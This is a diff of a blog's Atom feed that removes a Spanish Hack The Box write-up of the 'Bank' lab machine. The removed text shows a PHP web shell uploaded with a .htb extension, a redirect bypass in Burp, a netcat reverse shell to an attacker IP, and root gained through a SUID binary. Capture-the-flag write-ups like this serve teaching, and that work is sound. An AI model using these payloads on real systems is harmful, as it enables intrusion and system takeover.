-                &amp;lt;label&amp;gt;Message&amp;lt;/label&amp;gt;                                                                                           
-                &amp;lt;textarea required &lt;span class=&quot;nv&quot;&gt;placeholder&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Tell us your problem&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;form-control&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;height: 170px; background-repea
-t: repeat; background-image: none; background-position: 0% 0%;&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;message&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;ticket_message&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/textarea&amp;gt;
-                &amp;lt;br&amp;gt;                                            
-                &amp;lt;div &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;position:relative;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] I added the file extension .htb to execute as php &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;debugging purposes only &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;DEBUG] &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                        &amp;lt;a &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'btn btn-primary'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;href&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'javascript:;'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                            Choose File...
-                                            &amp;lt;input &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;file&quot;&lt;/span&gt; required &lt;span class=&quot;nv&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'position:absolute;z-index:2;top:0;left:0;filter: alpha(opacity=0);-ms-filter:&quot;progid:DXImageTransform.Microsoft.Alpha(Opacity=0)&quot;;opacity:0;background-color:transparent;color:transparent;'&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;fileToUpload&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;40&quot;&lt;/span&gt;  &lt;span class=&quot;nv&quot;&gt;onchange&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'$(&quot;#upload-file-info&quot;).html($(this).val().replace(&quot;C:\\fakepath\\&quot;, &quot;&quot;));'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-                                        &amp;lt;/a&amp;gt;
-                                        &amp;amp;nbsp&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-                                        &amp;lt;span &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'label label-info'&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;upload-file-info&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/span&amp;gt;
-                                &amp;lt;/div&amp;gt;
-                                &amp;lt;br&amp;gt;
-                &amp;lt;button &lt;span class=&quot;nv&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submitadd&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;submit&quot;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;btn btn-primary mt20&quot;&lt;/span&gt; data-disable-with&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;div class=&amp;amp;quot;loading-o&amp;amp;quot; style=&amp;amp;quot;padding: 7px 21px;&amp;amp;quot;&amp;gt;&amp;lt;/div&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;Submit&amp;lt;/button&amp;gt;
-            &amp;lt;/form&amp;gt;
-
-        &amp;lt;/div&amp;gt;
-
-    &amp;lt;/section&amp;gt;
-
-&amp;lt;/div&amp;gt;
-
-        &amp;lt;/div&amp;gt;
-        &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; /#page-wrapper &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &amp;lt;/div&amp;gt;
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; /#wrapper &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; jQuery &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/jquery.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Bootstrap Core JavaScript &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/bootstrap.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Morris Charts JavaScript &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/raphael.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/morris.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/plugins/morris/morris-data.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-
-    &amp;lt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; SweetAlert &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
-    &amp;lt;script &lt;span class=&quot;nv&quot;&gt;src&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;./assets/js/sweetalert.min.js&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;lt;/script&amp;gt;
-
-&amp;lt;/body&amp;gt;
-
-&amp;lt;/html&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Vemos que las respuestas son diferentes y además, si ponemos ojo de lince, tenemos lo siguiente &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] --&amp;gt;&lt;/code&gt; en la respuesta de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt;. Aquí nos indica que para ejecutar un archivo php debemos de cambiar la extensión a htb. Para poder visualizar el contenido de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; sin que nos aplique el &lt;em&gt;redirect&lt;/em&gt; vamos a hacer uso de &lt;strong&gt;&lt;em&gt;Burp Suite&lt;/em&gt;&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;p&gt;En la herramienta vamos a declarar realizar las siguientes configuraciones:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;Declarar el scope: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;http://bank.htb/&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-burp.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Match and Replace: Cambiar el código de estado &lt;strong&gt;302 Found&lt;/strong&gt; por &lt;strong&gt;200 Ok&lt;/strong&gt;.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-burp1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Con esto y con ayuda del pluggin &lt;strong&gt;Foxy Proxy&lt;/strong&gt; apuntando al &lt;strong&gt;Burp Suite&lt;/strong&gt; vamos a tratar de ingresar al recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;support.php&lt;/code&gt; sin capturar la petición y nos debería aparecer lo siguiente:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora, vamos a crear un nuevo ticket y subir un archivo &lt;strong&gt;php&lt;/strong&gt; con extensión &lt;strong&gt;htb&lt;/strong&gt; con el cual podamos hacer ejecución de comandos, para este caso lo llamaremos &lt;strong&gt;k4mishell.htb&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
-  &lt;span class=&quot;k&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;pre&amp;gt;&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;shell_exec&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_REQUEST&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'cmd'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;&amp;lt;/pre&amp;gt;&quot;&lt;/span&gt;
-&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Le damos click en &lt;strong&gt;Click Here&lt;/strong&gt; y nos lleva a nuestro archivo bajo el recurso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/uploads&lt;/code&gt; y vemos que podemos ejecutar comandos a nivel de sistema.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-bank/bank-web3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Ahora vamos a ponernos en escucha por el puerto 443 y vamos a entablarnos una reverse shell.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://bank.htb/uploads/k4mishell.htb?cmd&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;nohup &lt;/span&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.27 443 &amp;amp;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nc &lt;span class=&quot;nt&quot;&gt;-nlvp&lt;/span&gt; 443
-listening on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;any] 443 ...
-connect to &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.14.27] from &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNKNOWN&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;10.10.10.29] 42698
-&lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;www-data
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Para trabajar más comodos vamos a hacer un &lt;a href=&quot;/tratamiento-tty&quot;&gt;Tratamiento de la tty&lt;/a&gt; y vemos que podemos visualizar la flag (user.txt); por lo tanto vamos a enumerar un poco el sistema para ver de que forma nos podemos convertir en &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
-&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;33&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;www-data&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;www-data: 
-www-data@bank:/home/chris&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /
-www-data@bank:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
-./var/htb/bin/emergency
-./usr/lib/eject/dmcrypt-get-device
-./usr/lib/openssh/ssh-keysign
-./usr/lib/dbus-1.0/dbus-daemon-launch-helper
-./usr/lib/policykit-1/polkit-agent-helper-1
-./usr/bin/at
-./usr/bin/chsh
-./usr/bin/passwd
-./usr/bin/chfn
-./usr/bin/pkexec
-./usr/bin/newgrp
-./usr/bin/traceroute6.iputils
-./usr/bin/gpasswd
-./usr/bin/sudo
-./usr/bin/mtr
-./usr/sbin/uuidd
-./usr/sbin/pppd
-./bin/ping
-./bin/ping6
-./bin/su
-./bin/fusermount
-./bin/mount
-./bin/umount
-www-data@bank:/&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Nos encontramos con el binario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/var/htb/bin/emergency&lt;/code&gt; el cual tiene permisos SUID, por lo tanto vamos a probar a ejecutarlo a ver que pasa.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@bank:/&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/var/htb/bin/emergency
-&lt;span class=&quot;c&quot;&gt;# whoami&lt;/span&gt;
-root
-&lt;span class=&quot;c&quot;&gt;# &lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt). Si le aplicamos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; al binario, vemos que podría hacer multiples cosas y una cadena imprimible en donde se observa &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/sh&lt;/code&gt;, que es lo que nos despliega al ejecutarlo.&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Linux" /><category term="PHP" /><category term="Arbitrary_File_Upload" /><category term="SUID" /><summary type="html">Resolución de la máquina Bank en la plataforma de Hack The Box</summary></entry></feed>
+&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar la flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="Sandbox_Escape" /><summary type="html">Resolución de la máquina Cache en la plataforma de Hack The Box</summary></entry></feed>
